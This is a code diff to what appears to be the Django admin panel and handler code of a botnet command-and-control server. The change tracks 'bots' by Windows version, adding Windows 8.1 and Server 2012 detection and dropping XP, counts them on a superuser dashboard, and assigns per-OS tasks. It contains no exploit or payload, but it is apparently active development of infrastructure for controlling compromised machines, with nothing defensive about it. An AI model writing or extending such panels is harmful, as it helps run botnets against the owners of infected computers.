@@ -96,7 +96,7 @@ class AdminPanel:
 
         counts_is_win7 = Bot.objects.filter(is_win7=True).count()
         counts_is_win10 = Bot.objects.filter(is_win10=True).count()
-        counts_is_winxp = Bot.objects.filter(is_winxp=True).count()
+        counts_is_win81 = Bot.objects.filter(is_win81=True).count()
         counts_is_win8 = Bot.objects.filter(is_win8=True).count()
         counts_is_win11 = Bot.objects.filter(is_win11=True).count()
 
@@ -107,10 +107,9 @@ class AdminPanel:
         in_day = self.sub.get_by_day(bots)
         in_month = self.sub.get_by_month(bots)
         total = bots.count()
-        print([counts_is_win7, counts_is_winxp, counts_is_win8, counts_is_win10, counts_is_win11])
 
         if request.user.is_superuser:
-            return render(request, 'main/main.html', {'win_version': [counts_is_win7, counts_is_winxp, counts_is_win8,
+            return render(request, 'main/main.html', {'win_version': [counts_is_win7, counts_is_win81, counts_is_win8,
                                                                       counts_is_win10, counts_is_win11],
                                                       'x_oc': [_32x, _64x], 'in_week': in_week, 'in_day': in_day,
                                                       'in_month': in_month, 'total': total})
@@ -306,10 +305,18 @@ class Handlers:
 
                 if os_major == 10 and os_minor == 0:
                     _bot.is_win10 = True
-                elif os_major == 6 and os_minor == 1:
+
+                if os_major == 6 and os_minor == 1:
                     _bot.is_win7 = True
-                elif os_major == 5 and os_minor == 1:
-                    _bot.is_winxp = True
+
+                if (os_major == 6 and os_minor == 2) and is_server:
+                    _bot.is_server2012 = True
+                elif (os_major == 6 and os_minor == 2) and not is_server:
+                    _bot.is_win8 = True
+                elif (os_major == 6 and os_minor == 3) and is_server:
+                    _bot.is_server2012r2 = True
+                elif (os_major == 6 and os_minor == 3) and not is_server:
+                    _bot.is_win81 = True
 
                 if is_x64:
                     xoc = 'x64'
@@ -318,8 +325,8 @@ class Handlers:
 
                 _bot.save()
 
-                if _bot.is_winxp:
-                    task_win = 'winxp'
+                if _bot.is_win81:
+                    task_win = 'win81'
                 elif _bot.is_win7:
                     task_win = 'win7'
                 elif _bot.is_win10:
@@ -422,6 +429,7 @@ class Handlers:
         s = {
             'win7': Bot.objects.filter(is_win7=True),
             'win8': Bot.objects.filter(is_win8=True),
+            'win81': Bot.objects.filter(is_win81=True),
             'win10': Bot.objects.filter(is_win10=True),
             'win11': Bot.objects.filter(is_win11=True),
             'all_win': Bot.objects.all()
